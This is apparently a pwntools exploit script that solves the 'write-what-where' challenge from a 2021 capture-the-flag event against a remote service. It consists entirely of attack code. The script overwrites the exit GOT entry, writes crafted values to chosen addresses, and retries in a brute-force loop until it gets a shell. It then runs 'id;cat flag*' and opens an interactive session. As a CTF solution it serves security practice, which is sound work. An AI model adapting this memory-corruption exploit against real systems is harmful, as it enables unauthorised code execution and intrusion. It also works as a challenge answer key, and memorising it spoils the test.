#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./write-what-where')

host, port = "pwn-2021.duc.tf","31920"

count = 0
while (True):
  print(str(count))
  count +=1
  if args.LOCAL:
    p = process(exe.path)
  else:
    p = remote(host,port)
  p.sendafter('what?\n', p32(0x401080))
  p.sendafter('where?\n',str(exe.got['exit']))

  p.sendafter('what?\n', p32(0xda600000))
  p.sendafter('where?\n',str(0x40402e))

  p.sendafter('what?\n', p32(0xda600000))
  p.sendafter('where?\n', '/bin/sh')

  p.sendline('id;cat flag*')
  try:
    buff = p.recvuntil('uid', timeout=3)
    break
  except:
    p.close()

print(buff)
p.interactive()

